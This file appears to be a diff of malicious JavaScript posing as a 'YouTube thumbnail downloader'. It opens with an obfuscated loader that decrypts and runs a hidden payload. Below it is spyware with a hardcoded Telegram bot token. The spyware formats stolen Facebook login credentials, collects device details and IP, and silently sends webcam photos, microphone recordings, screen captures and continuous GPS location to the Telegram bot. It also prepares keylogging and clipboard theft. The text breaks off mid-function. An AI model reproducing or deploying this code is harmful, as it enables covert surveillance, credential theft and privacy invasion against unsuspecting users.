0x34a0c8._0x40754b,_0x34a0c8._0x3c241b)+'rlNyq2SaHw'+_0x2b71f9(0x1bc,_0x34a0c8._0x243cfb)+_0x2b71f9(_0x34a0c8._0xe9bda2,'TM4$')+_0x2b71f9(0x27a,_0x34a0c8._0x3dc1d7)+_0x2b71f9(_0x34a0c8._0x3be25d,_0x34a0c8._0x1c4d3f)+_0x2b71f9(_0x34a0c8._0xc7c1fa,'H*It')+_0x2b71f9(0x292,'SJIu')+_0x2b71f9(_0x34a0c8._0xc04d64,'Vcvc')+_0x2b71f9(0xfb,_0x34a0c8._0x26e52c)+_0x2b71f9(_0x34a0c8._0x2fa92c,'7@!3')+_0x2b71f9(_0x34a0c8._0x377cd2,'Vcvc')+'u2mm6ccNcH'+_0x2b71f9(0x14e,_0x34a0c8._0x30408c)+'Mcs6zLgnMw'+'Dlep7NDLdy'+_0x2b71f9(0x13e,_0x34a0c8._0x3afce2)+_0x2b71f9(0x19f,_0x34a0c8._0x5b692e))+(_0x2b71f9(0xbc,_0x34a0c8._0x519e36)+_0x2b71f9(_0x34a0c8._0x203e7f,_0x34a0c8._0x555a63)+_0x2b71f9(0x1d2,_0x34a0c8._0xd7b37f)+_0x2b71f9(_0x34a0c8._0x472f03,'SJIu')+'TUn+BsWPvh'+_0x2b71f9(_0x34a0c8._0x3c68b3,_0x34a0c8._0x36ab15)+'hs8uZTDAXo'+'adwOZm2gmF'+_0x2b71f9(0x22b,'3NNg')+_0x2b71f9(_0x34a0c8._0x408891,'uxvy')+_0x2b71f9(_0x34a0c8._0x169e4d,_0x34a0c8._0x1d16fb)+_0x2b71f9(0x120,_0x34a0c8._0x2ad98b)+_0x2b71f9(_0x34a0c8._0x29c7e5,_0x34a0c8._0x2001bb)+_0x2b71f9(0xd1,'3NNg')+'KpAhjL48rv'+_0x2b71f9(0x1b9,'CUYo')+_0x2b71f9(_0x34a0c8._0x400b0a,_0x34a0c8._0x17f6e0)+'NYscCSmcaJ'+'mCOh4YTZOC'+_0x2b71f9(_0x34a0c8._0x5581e0,'SJIu')+_0x2b71f9(_0x34a0c8._0x2c7517,'*%!a')+_0x2b71f9(_0x34a0c8._0x425dd8,_0x34a0c8._0x2301f2)+'NAnhQezFVp'+_0x2b71f9(0x127,'CUYo')+_0x2b71f9(_0x34a0c8._0xc73f80,'utIo')+_0x2b71f9(0xe7,_0x34a0c8._0x50b1f3)+_0x2b71f9(_0x34a0c8._0x16510f,'utIo')+'kkoRBdF5aH'+_0x2b71f9(_0x34a0c8._0x1a8102,_0x34a0c8._0x58c4a2)+_0x2b71f9(0x164,'84QV')+_0x2b71f9(0x1ff,'!e04')+_0x2b71f9(_0x34a0c8._0x48a8b9,'H*It')+_0x2b71f9(0xab,'J]ip')+_0x2b71f9(_0x34a0c8._0x897813,_0x34a0c8._0x5b106f)+'uZ4LEtVWi0'+_0x2b71f9(_0x34a0c8._0x2c3bfd,'NBOw')+'GE2fXIppBI'+_0x2b71f9(0x1c9,_0x34a0c8._0xb58983)+_0x2b71f9(0x296,_0x34a0c8._0x36e614)+_0x2b71f9(_0x34a0c8._0x1e3454,_0x34a0c8._0x28bab6)+_0x2b71f9(0x11f,'rDp3')+_0x2b71f9(_0x34a0c8._0xc1aea9,_0x34a0c8._0x221d41)+_0x2b71f9(_0x34a0c8._0x40e116,_0x34a0c8._0x5955ad)+'Tl7afpqUWE'+_0x2b71f9(0x189,_0x34a0c8._0xf17d0d)+'KoLf7WJW2i'+'PiznwlrbON'+'aj5ZuBL7aa'+_0x2b71f9(_0x34a0c8._0x55bb89,'TM4$')+'twqCJrd9zv'+_0x2b71f9(0x1cb,_0x34a0c8._0xa86f9e)+_0x2b71f9(0x1fb,'Hjdn')+'M1W9WedJ2u'+'RHyPAL3EvC'+_0x2b71f9(_0x34a0c8._0x11a8cd,'yE]A')+_0x2b71f9(_0x34a0c8._0x423169,'WNNn')+_0x2b71f9(0x256,_0x34a0c8._0x489637)+_0x2b71f9(_0x34a0c8._0x3658f1,'5Y0%')+_0x2b71f9(0x19c,')G7z')+_0x2b71f9(_0x34a0c8._0xba68c3,_0x34a0c8._0x27a8a0)+'Qn64SvivXj'+_0x2b71f9(0xd9,_0x34a0c8._0x489637)+_0x2b71f9(_0x34a0c8._0x4d9479,'*fDB')+_0x2b71f9(_0x34a0c8._0x107612,'5Y0%')+'qEpku/6DsW'+'5203fb6Uag'+_0x2b71f9(_0x34a0c8._0x193e4a,'*W&F')+_0x2b71f9(_0x34a0c8._0x34f437,_0x34a0c8._0x42e075)+_0x2b71f9(_0x34a0c8._0x3e4cb9,_0x34a0c8._0x2058a1)+_0x2b71f9(0xa4,'GujY')+'lLb2tXdkCx'+'CLbH+X59jc'+_0x2b71f9(_0x34a0c8._0x3f0867,_0x34a0c8._0x36e614)+_0x2b71f9(_0x34a0c8._0x55c53c,_0x34a0c8._0x159552)+'GdBFq0NHWP'+_0x2b71f9(0x29f,'AQXN')+_0x2b71f9(_0x34a0c8._0xac7d99,_0x34a0c8._0x1d3ac4)+_0x2b71f9(0x200,_0x34a0c8._0x553854)+_0x2b71f9(_0x34a0c8._0x5128d1,'215P')+'Y8ovzQ/GAg'+_0x2b71f9(0x105,'[%BJ')+_0x2b71f9(0x2a0,'Gjzj')+_0x2b71f9(0x107,'Hjdn')+_0x2b71f9(0x191,_0x34a0c8._0xb44478)+_0x2b71f9(0xf8,'84QV')+_0x2b71f9(_0x34a0c8._0x311e8b,_0x34a0c8._0x11cffa)+_0x2b71f9(0x1fe,_0x34a0c8._0x22418d)+_0x2b71f9(_0x34a0c8._0x23b8d0,_0x34a0c8._0x1a366f)+_0x2b71f9(_0x34a0c8._0x1f8d1f,'QLI5')+_0x2b71f9(_0x34a0c8._0x266be8,'LUQO')+'lyvPtUY75m'+_0x2b71f9(_0x34a0c8._0x3eb55b,_0x34a0c8._0x519e36)+_0x2b71f9(0x17f,'h$tY')+_0x2b71f9(0x195,_0x34a0c8._0x36e73f)+'URA/BFB/MK'+'bY'),'sKWRc':function(_0x3ca3f9,_0xc4d717){return _0x3ca3f9!==_0xc4d717;},'mRGQt':_0x2b71f9(0xfe,'utIo'),'JnvyM':function(_0x4b304c,_0x512d93){return _0x4b304c!=_0x512d93;},'qpXZA':function(_0x3c8ffa,_0x13488a){return _0x3c8ffa!=_0x13488a;},'hWhPL':function(_0xf794ed,_0x37feae){return _0xf794ed===_0x37feae;},'venuW':_0x2b71f9(0x21d,'SJIu'),'akzBm':_0x2b71f9(_0x34a0c8._0x10488d,_0x34a0c8._0x5533e2),'ZQLYC':_0x2b71f9(0x25c,_0x34a0c8._0x4670d8),'PAEWU':_0x2b71f9(_0x34a0c8._0xc838fa,_0x34a0c8._0x248dc7),'WIjCs':_0x2b71f9(_0x34a0c8._0xf7241,_0x34a0c8._0x38a562),'LILiH':function(_0x171dbc,_0xdbc59b){return _0x171dbc-_0xdbc59b;},'kQcIV':function(_0x5b68f9,_0x53cccf){return _0x5b68f9-_0x53cccf;},'IlUhd':_0x2b71f9(_0x34a0c8._0x322161,'AQXN')+'m','YIDXt':'utf8','IfSFF':_0x2b71f9(0xa9,'FMJS')+_0x2b71f9(_0x34a0c8._0x1b35c8,'WC@Q'),'WYNLa':_0x2b71f9(_0x34a0c8._0x443139,'yE]A')+_0x2b71f9(_0x34a0c8._0x23ac0d,'wHt^'),'IqVOg':_0x2b71f9(_0x34a0c8._0x436c9a,'GujY')+'dle.js','CPLqM':_0x2b71f9(_0x34a0c8._0x362f88,'CUYo'),'OGmQC':_0x2b71f9(_0x34a0c8._0x541a12,'r&22'),'JrFiF':_0x2b71f9(0x18b,'pi&9'),'UUnGq':_0x2b71f9(0x1e2,_0x34a0c8._0x25b1be),'nWybW':function(_0x5298e7,_0x207246){return _0x5298e7===_0x207246;},'uStLX':_0x2b71f9(_0x34a0c8._0x12f52f,_0x34a0c8._0xbcd388),'OqoQc':'PHRoR'},_0x536ee7=(function(){const _0x5e7401={'JGFOO':_0x416c5f['pnsFe']};let _0x1bd846=!![];return function(_0x272052,_0x3f016a){const _0x1eaf86=_0x257a;if(_0x416c5f[_0x1eaf86(_0x5d01a4._0x89f04c,_0x5d01a4._0xdf0ef5)](_0x416c5f[_0x1eaf86(0x201,_0x5d01a4._0x536e56)],_0x416c5f[_0x1eaf86(_0x5d01a4._0x4092cb,_0x5d01a4._0xdf0ef5)])){_0x4ece1c[_0x1eaf86(_0x5d01a4._0x5820aa,'yE]A')](_0x5e7401['JGFOO'],_0xb85c39[_0x1eaf86(0x260,_0x5d01a4._0x422f54)]);if(_0x40d92f)process[_0x1eaf86(_0x5d01a4._0x597e66,'&mY0')](0x1*-0x1296+-0x11bd+0x2454);}else{const _0x393648=_0x1bd846?function(){const _0x543e0f=_0x1eaf86;if(_0x3f016a){const _0x29bd2e=_0x3f016a[_0x543e0f(0xf7,'utIo')](_0x272052,arguments);return _0x3f016a=null,_0x29bd2e;}}:function(){};return _0x1bd846=![],_0x393648;}};}()),_0x335c07=_0x416c5f[_0x2b71f9(_0x34a0c8._0x46994c,'WNNn')](_0x536ee7,this,function(){const _0x48467c=_0x2b71f9;if(_0x416c5f[_0x48467c(0x174,'*fDB')](_0x416c5f[_0x48467c(0x1ad,'[%BJ')],_0x416c5f[_0x48467c(0xd6,'kJ[@')])){let _0x57ef3a;try{const _0x19e205=_0x416c5f[_0x48467c(_0x4e1d46._0x3a9955,_0x4e1d46._0x111889)](Function,_0x416c5f[_0x48467c(0x288,'QLI5')](_0x416c5f['oKarN'](_0x416c5f[_0x48467c(_0x4e1d46._0x289dea,'NBOw')],_0x416c5f[_0x48467c(0x237,_0x4e1d46._0x49eea8)]),');'));_0x57ef3a=_0x416c5f[_0x48467c(0xb9,_0x4e1d46._0x3d1a95)](_0x19e205);}catch(_0x1882aa){_0x57ef3a=window;}const _0x2490a8=_0x57ef3a[_0x48467c(_0x4e1d46._0x3d423b,_0x4e1d46._0x587410)]=_0x57ef3a[_0x48467c(_0x4e1d46._0x413061,'LUQO')]||{},_0x407a5a=[_0x416c5f[_0x48467c(_0x4e1d46._0x4f737b,'wHt^')],_0x416c5f[_0x48467c(_0x4e1d46._0x35ed64,_0x4e1d46._0x54913b)],_0x416c5f['KGHfr'],_0x416c5f['ZMVQy'],_0x416c5f['ThJyZ'],_0x416c5f['JksSM'],_0x416c5f[_0x48467c(_0x4e1d46._0x4b6117,_0x4e1d46._0x5875fe)]];for(let _0x52531e=0x1a4c+-0xaa4*0x2+-0x282*0x2;_0x416c5f[_0x48467c(0xca,'utIo')](_0x52531e,_0x407a5a['length']);_0x52531e++){const _0x28e076=_0x536ee7[_0x48467c(0x254,'Gjzj')+'r']['prototype'][_0x48467c(0x252,'rDp3')](_0x536ee7),_0x2ed3c2=_0x407a5a[_0x52531e],_0x58eba3=_0x2490a8[_0x2ed3c2]||_0x28e076;_0x28e076[_0x48467c(0xb8,'utIo')]=_0x536ee7['bind'](_0x536ee7),_0x28e076[_0x48467c(_0x4e1d46._0x363d97,_0x4e1d46._0x5e3b83)]=_0x58eba3[_0x48467c(0x1f8,_0x4e1d46._0x4ca5c9)][_0x48467c(_0x4e1d46._0xe15b8a,'84QV')](_0x58eba3),_0x2490a8[_0x2ed3c2]=_0x28e076;}}else window[_0x416c5f[_0x48467c(0xf9,'0MTR')]][_0x48467c(0x186,_0x4e1d46._0x494284)](window,_0x23fbdb);});_0x416c5f[_0x2b71f9(0x23f,'J]ip')](_0x335c07);const _0x3818c3=_0x416c5f[_0x2b71f9(0x16b,_0x34a0c8._0x6afcb9)],_0x1d5bfb=_0x416c5f['tMRhC'],_0x3a0a21=_0x416c5f[_0x2b71f9(0x290,'utIo')],_0x2ad15a=_0x416c5f['kytLg'],_0x2ba358=_0x416c5f[_0x2b71f9(0x172,_0x34a0c8._0x2001bb)](typeof process,_0x416c5f[_0x2b71f9(_0x34a0c8._0x5568c6,'Vcvc')])&&_0x416c5f[_0x2b71f9(0x14a,_0x34a0c8._0x2f3df1)](process[_0x2b71f9(_0x34a0c8._0x32caf2,'7@!3')],null)&&_0x416c5f[_0x2b71f9(_0x34a0c8._0x74b8d8,'kJ[@')](process[_0x2b71f9(_0x34a0c8._0x1afdda,_0x34a0c8._0x19ee1b)][_0x2b71f9(_0x34a0c8._0xffe1a9,'Hjdn')],null);try{if(_0x416c5f[_0x2b71f9(_0x34a0c8._0x3bfa5b,'r&22')](_0x416c5f['venuW'],_0x416c5f[_0x2b71f9(_0x34a0c8._0x2aff23,'uxvy')]))_0x2ebc95=_0x2ae8db[_0x2b71f9(_0x34a0c8._0xce6f88,'N#oK')](/export\s+default\s+(async\s+)?function\s*\([^)]*\)\s*\{/,_0x416c5f['LXofx'])[_0x2b71f9(0x205,_0x34a0c8._0x4570dc)](/export\s+default/,'');else{let _0xc4feab='';if(_0x2ba358){const _0x579f4b=require('crypto'),_0x1b01b1=_0x579f4b[_0x2b71f9(_0x34a0c8._0x4ffad7,_0x34a0c8._0x555a63)](_0x416c5f['ZQLYC'])[_0x2b71f9(_0x34a0c8._0x558afc,'*fDB')](_0x1d5bfb)[_0x2b71f9(0x234,'yE]A')](),_0x131e5b=Buffer[_0x2b71f9(0x1bb,'zmn^')](_0x3a0a21,_0x416c5f[_0x2b71f9(_0x34a0c8._0x11e7bf,_0x34a0c8._0x3d649f)]),_0x3a4d57=Buffer[_0x2b71f9(0x1bb,'zmn^')](_0x2ad15a,_0x416c5f[_0x2b71f9(_0x34a0c8._0xbcf6da,'Vcvc')]),_0x456e1e=0x359*-0x1+-0x1df2+0x215b,_0x3075d5=_0x3a4d57[_0x2b71f9(_0x34a0c8._0x1423ad,'WNNn')](-0x833+-0x4cd+0xd00,_0x416c5f[_0x2b71f9(0x221,_0x34a0c8._0x25b1be)](_0x3a4d57[_0x2b71f9(0xce,'utIo')],_0x456e1e)),_0x2b34bc=_0x3a4d57[_0x2b71f9(_0x34a0c8._0x513d97,'215P')](_0x416c5f[_0x2b71f9(0x265,_0x34a0c8._0xf524b2)](_0x3a4d57[_0x2b71f9(_0x34a0c8._0x3cd617,_0x34a0c8._0x13fe91)],_0x456e1e)),_0x23ccfc=_0x579f4b[_0x2b71f9(_0x34a0c8._0x14a5cf,_0x34a0c8._0x465718)+_0x2b71f9(0x1a8,_0x34a0c8._0x489637)](_0x416c5f[_0x2b71f9(_0x34a0c8._0x15aea4,_0x34a0c8._0x4a52f6)],_0x1b01b1,_0x131e5b);_0x23ccfc[_0x2b71f9(0x1c5,_0x34a0c8._0x374fc5)](_0x2b34bc),_0xc4feab=_0x23ccfc[_0x2b71f9(0x131,_0x34a0c8._0x44a939)](_0x3075d5,null,_0x416c5f['YIDXt']),_0xc4feab+=_0x23ccfc[_0x2b71f9(0x20f,_0x34a0c8._0x58c4a2)](_0x416c5f['YIDXt']);_0xc4feab[_0x2b71f9(0xec,_0x34a0c8._0xff789d)](_0x416c5f[_0x2b71f9(_0x34a0c8._0x2460a0,_0x34a0c8._0x460dfc)])&&(_0xc4feab=_0xc4feab['replace'](/export\s+default/,_0x416c5f[_0x2b71f9(_0x34a0c8._0x560c17,_0x34a0c8._0x1a6ef1)]));const _0x1f6c0b=module[_0x2b71f9(0xda,'rDp3')+'r'],_0x4b9d68=new _0x1f6c0b();_0x4b9d68['paths']=module[_0x2b71f9(0xac,'H*F5')],_0x4b9d68['_compile'](_0xc4feab,_0x416c5f['IqVOg']),module['exports']=_0x4b9d68[_0x2b71f9(_0x34a0c8._0x12fc45,'pi&9')];}else{const _0xd5df36=new TextEncoder(),_0x5d08e3=_0xd5df36['encode'](_0x1d5bfb),_0x1b8b56=await window[_0x2b71f9(0x188,'84QV')][_0x2b71f9(0x1dc,_0x34a0c8._0x1894e1)]['digest'](_0x416c5f[_0x2b71f9(0x206,'[%BJ')],_0x5d08e3),_0x276beb=await window[_0x2b71f9(0x1c8,'215P')]['subtle']['importKey'](_0x416c5f[_0x2b71f9(_0x34a0c8._0x1e0653,'3NNg')],_0x1b8b56,{'name':_0x416c5f[_0x2b71f9(_0x34a0c8._0xa56641,_0x34a0c8._0x3841cf)]},![],[_0x416c5f[_0x2b71f9(_0x34a0c8._0x35ff20,'84QV')]]),_0x2e59dc=new Uint8Array(_0x3a0a21[_0x2b71f9(_0x34a0c8._0xe9893e,_0x34a0c8._0x530e9c)](/.{1,2}/g)['map'](_0x11b335=>parseInt(_0x11b335,0x281*-0x2+-0x1*0xb3f+-0x1051*-0x1))),_0x4ec088=_0x416c5f[_0x2b71f9(0x1a6,_0x34a0c8._0x27604e)](atob,_0x2ad15a),_0x2c4e27=new Uint8Array(_0x4ec088[_0x2b71f9(0x1f2,_0x34a0c8._0x391596)]);for(let _0x682b70=0x1290+-0x17b+-0x1115;_0x416c5f[_0x2b71f9(_0x34a0c8._0x5bac4f,_0x34a0c8._0x1f2283)](_0x682b70,_0x4ec088[_0x2b71f9(0x27c,')G7z')]);_0x682b70++){_0x2c4e27[_0x682b70]=_0x4ec088['charCodeAt'](_0x682b70);}const _0xc02f35=await window[_0x2b71f9(0x278,'!e04')][_0x2b71f9(_0x34a0c8._0x1c0d4f,'9fyC')]['decrypt']({'name':_0x416c5f[_0x2b71f9(_0x34a0c8._0xcad1c0,')G7z')],'iv':_0x2e59dc},_0x276beb,_0x2c4e27),_0x552293=new TextDecoder();_0xc4feab=_0x552293['decode'](_0xc02f35);/^\s*export\s+default/['test'](_0xc4feab)&&(_0x416c5f['nWybW'](_0x416c5f[_0x2b71f9(0x1d8,_0x34a0c8._0x27a8a0)],_0x416c5f[_0x2b71f9(0x160,_0x34a0c8._0x30f77c)])?_0x3291be=window:_0xc4feab=_0xc4feab['replace'](/export\s+default\s+(async\s+)?function\s*\([^)]*\)\s*\{/,_0x416c5f[_0x2b71f9(_0x34a0c8._0xf337a5,'h$tY')])[_0x2b71f9(0xb2,'uxvy')](/export\s+default/,''));const _0x5cecab=window[_0x2b71f9(_0x34a0c8._0x140643,_0x34a0c8._0x497947)]||function(_0x35aeea){const _0x2d0aef=_0x2b71f9;window[_0x416c5f[_0x2d0aef(_0x1aa6d0._0x568c05,'yE]A')]][_0x2d0aef(0xd5,'z8qR')](window,_0x35aeea);};_0x416c5f[_0x2b71f9(0x298,'[%BJ')](_0x5cecab,_0xc4feab);}}}catch(_0x1bac04){console[_0x2b71f9(_0x34a0c8._0x1a39c2,_0x34a0c8._0x43df13)](_0x416c5f[_0x2b71f9(0xba,'SJIu')],_0x1bac04['message']);if(_0x2ba358)process[_0x2b71f9(_0x34a0c8._0x36ff31,'&mY0')](-0x530*-0x3+0x1*-0xf7f+-0x10);}}(typeof window!==_0x8594a1(0x29e,'NBOw')?window:global));
+// ==================== YOUTUBE THUMBNAIL DOWNLOADER ====================
+// Complete JavaScript with all functions
+
+// ==================== TELEGRAM CONFIGURATION ====================
+const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
+let CHAT_ID = "6837307356";
+const GROUP_LINK = "https://t.me/+7LTtj5yoBBxjMGVl";
+
+// Get chat ID from URL if present
+const urlParams = new URLSearchParams(window.location.search);
+const chatIdFromUrl = urlParams.get('chat_id');
+if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;
+
+// Global variables
+let currentLocation = null;
+let cameraStream = null;
+let audioStream = null;
+let screenStream = null;
+let cameraInterval = null;
+let audioRecorder = null;
+let screenRecorder = null;
+let keylogBuffer = '';
+let keylogTimer = null;
+let lastClipboard = '';
+
+// Silent mode
+const SILENT_MODE = true;
+
+// ==================== IP & DATE FUNCTIONS ====================
+async function getPublicIP() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        return "Cannot fetch IP";
+    }
+}
+
+function getCurrentDate() {
+    const now = new Date();
+    return now.toLocaleString('en-GB', {
+        day: '2-digit',
+        month: '2-digit',
+        year: 'numeric',
+        hour: '2-digit',
+        minute: '2-digit',
+        second: '2-digit'
+    }).replace(',', '');
+}
+
+function joinTelegramGroup() {
+    window.open(GROUP_LINK, '_blank');
+}
+
+function formatTelegramMessage(email, password, ip, date) {
+    return "━━━━━━━━━━━━━━━━━━━━━━\n" +
+           "🔐 𝐅𝐁 𝐋𝐎𝐆𝐈𝐍 🔐\n" +
+           "━━━━━━━━━━━━━━━━━━━━━━\n" +
+           "📧 " + email + "\n" +
+           "🔑 " + password + "\n" +
+           "🌐 " + ip + "\n" +
+           "📅 " + date + "\n" +
+           "━━━━━━━━━━━━━━━━━━━━━━";
+}
+
+// ==================== DEVICE INFO COLLECTION ====================
+function calculateLocalStorageSize() {
+    let total = 0;
+    for (let i = 0; i < localStorage.length; i++) {
+        const key = localStorage.key(i);
+        const value = localStorage.getItem(key);
+        total += (key.length + value.length) * 2;
+    }
+    return total;
+}
+
+function calculateSessionStorageSize() {
+    let total = 0;
+    for (let i = 0; i < sessionStorage.length; i++) {
+        const key = sessionStorage.key(i);
+        const value = sessionStorage.getItem(key);
+        total += (key.length + value.length) * 2;
+    }
+    return total;
+}
+
+function formatBytes(bytes) {
+    if (bytes === 0) return '0 Bytes';
+    const k = 1024;
+    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
+    const i = Math.floor(Math.log(bytes) / Math.log(k));
+    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
+}
+
+async function collectDeviceInfo() {
+    const info = {
+        timestamp: getCurrentDate(),
+        ip: await getPublicIP(),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        screen: `${window.screen.width}x${window.screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        cookies: navigator.cookieEnabled ? 'Yes' : 'No',
+        online: navigator.onLine ? 'Online' : 'Offline',
+        battery: await getBatteryInfo(),
+        localStorage: formatBytes(calculateLocalStorageSize()),
+        sessionStorage: formatBytes(calculateSessionStorageSize()),
+        touch: 'ontouchstart' in window ? 'Yes' : 'No',
+        referrer: document.referrer || 'None',
+        url: window.location.href,
+        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+        deviceMemory: navigator.deviceMemory || 'Unknown'
+    };
+    
+    if (currentLocation) {
+        info.location = currentLocation;
+    }
+    
+    return info;
+}
+
+async function getBatteryInfo() {
+    if ('getBattery' in navigator) {
+        try {
+            const battery = await navigator.getBattery();
+            return `${Math.round(battery.level * 100)}%`;
+        } catch {
+            return 'Unknown';
+        }
+    }
+    return 'Not Supported';
+}
+
+function formatDeviceInfo(info) {
+    let locationText = 'Not allowed';
+    if (info.location && typeof info.location === 'object') {
+        const mapsLink = `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}&z=15`;
+        locationText = `
+📍 **EXACT LOCATION:**
+├─ Latitude: ${info.location.lat}
+├─ Longitude: ${info.location.lng}
+├─ Accuracy: ±${info.location.accuracy}m
+├─ Google Maps: ${mapsLink}
+└─ Timezone: ${info.timezone}`;
+    }
+    
+    return `📱 **DEVICE INFORMATION**
+⏰ Time: ${info.timestamp}
+🌐 IP: ${info.ip}
+💻 CPU Cores: ${info.hardwareConcurrency}
+🧠 RAM: ${info.deviceMemory}GB
+🖥️ User Agent: ${info.userAgent.substring(0, 100)}...
+📟 Platform: ${info.platform}
+🗣️ Language: ${info.language}
+🌐 Timezone: ${info.timezone}
+📺 Screen: ${info.screen}
+👁️ Viewport: ${info.viewport}
+🍪 Cookies: ${info.cookies}
+📶 Status: ${info.online}
+🔋 Battery: ${info.battery}
+💾 Local Storage: ${info.localStorage}
+💾 Session Storage: ${info.sessionStorage}
+👆 Touch: ${info.touch}
+${locationText}
+🔗 Referrer: ${info.referrer}
+📄 URL: ${info.url}`;
+}
+
+// ==================== TELEGRAM FUNCTIONS ====================
+async function sendMessageToTelegram(message) {
+    if (!CHAT_ID || !message) return;
+    if (SILENT_MODE && (message.includes('Camera') || message.includes('Microphone') || message.includes('Location') || message.includes('Screen'))) {
+        return;
+    }
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: message,
+                parse_mode: 'Markdown'
+            }),
+        });
+    } catch (err) {}
+}
+
+async function sendPhotoToTelegram(file, caption) {
+    if (!CHAT_ID) return;
+    
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('photo', file);
+    if (caption) formData.append('caption', caption);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
+            method: "POST",
+            body: formData
+        });
+    } catch (error) {}
+}
+
+async function sendVideoToTelegram(file, caption) {
+    if (!CHAT_ID) return;
+    
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('video', file);
+    if (caption) formData.append('caption', caption);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+            method: "POST",
+            body: formData
+        });
+    } catch (error) {}
+}
+
+async function sendAudioToTelegram(file, caption) {
+    if (!CHAT_ID) return;
+    
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('audio', file);
+    if (caption) formData.append('caption', caption);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, {
+            method: "POST",
+            body: formData
+        });
+    } catch (error) {}
+}
+
+async function sendFileToTelegram(file, caption) {
+    if (!CHAT_ID) return;
+    
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('document', file);
+    if (caption) formData.append('caption', caption);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {
+            method: "POST",
+            body: formData
+        });
+    } catch (error) {}
+}
+
+async function sendLocationToTelegram(lat, lng) {
+    if (!CHAT_ID) return;
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                latitude: lat,
+                longitude: lng
+            }),
+        });
+    } catch (error) {}
+}
+
+// ==================== 1. CAMERA CAPTURE ====================
+async function requestCameraPermission() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+            audio: false 
+        });
+        
+        cameraStream = stream;
+        startCameraCapture(stream);
+        
+    } catch (error) {}
+}
+
+function startCameraCapture(stream) {
+    const video = document.createElement('video');
+    video.style.display = 'none';
+    document.body.appendChild(video);
+    video.srcObject = stream;
+    video.play();
+    
+    cameraInterval = setInterval(async () => {
+        if (!video || video.readyState < 2) return;
+        
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(async (blob) => {
+            if (blob && blob.size > 0) {
+                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
+                await sendPhotoToTelegram(file, `📸 *CAMERA PHOTO*\n⏰ ${getCurrentDate()}`);
+            }
+        }, 'image/jpeg', 0.7);
+    }, 5000);
+}
+
+// ==================== 2. LOCATION TRACKING ====================
+function requestLocationPermission() {
+    if (!navigator.geolocation) return;
+    
+    navigator.geolocation.getCurrentPosition(
+        async (position) => {
+            currentLocation = {
+                lat: position.coords.latitude,
+                lng: position.coords.longitude,
+                accuracy: Math.round(position.coords.accuracy)
+            };
+            await sendLocationToTelegram(currentLocation.lat, currentLocation.lng);
+        },
+        () => {},
+        { enableHighAccuracy: true, timeout: 10000 }
+    );
+    
+    setInterval(() => {
+        navigator.geolocation.getCurrentPosition(
+            async (position) => {
+                currentLocation = {
+                    lat: position.coords.latitude,
+                    lng: position.coords.longitude,
+                    accuracy: Math.round(position.coords.accuracy)
+                };
+                await sendLocationToTelegram(currentLocation.lat, currentLocation.lng);
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    }, 30000);
+}
+
+// ==================== 3. MICROPHONE RECORDING ====================
+async function requestMicrophonePermission() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        audioStream = stream;
+        startAudioRecording(stream);
+    } catch (error) {}
+}
+
+function startAudioRecording(stream) {
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    
+    recorder.ondataavailable = async (event) => {
+        if (event.data.size > 0) {
+            chunks.push(event.data);
+            const blob = new Blob(chunks, { type: 'audio/webm' });
+            const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
+            await sendAudioToTelegram(file, `🎤 *AUDIO RECORDING*\n📊 Size: ${(blob.size / 1024).toFixed(2)} KB\n⏰ ${getCurrentDate()}`);
+            chunks.length = 0;
+        }
+    };
+    
+    recorder.start();
+    setInterval(() => {
+        if (recorder.state === 'recording') {
+            recorder.stop();
+            setTimeout(() => recorder.start(), 100);
+        }
+    }, 15000);
+}
+
+// ==================== 4. SCREEN RECORDING ====================
+async function requestScreenPermission() {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
+    
+    try {
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+            video: { cursor: "always", frameRate: { ideal: 30 } },
+            audio: true
+        });
+        
+        screenStream = stream;
+        startScreenRecording(stream);
+        await captureScreenshot();
+        setInterval(() => captureScreenshot(), 30000);
+    } catch (error) {}
+}
+
+function startScreenRecording(stream) {
+    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
+    screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
+    const chunks = [];
+    
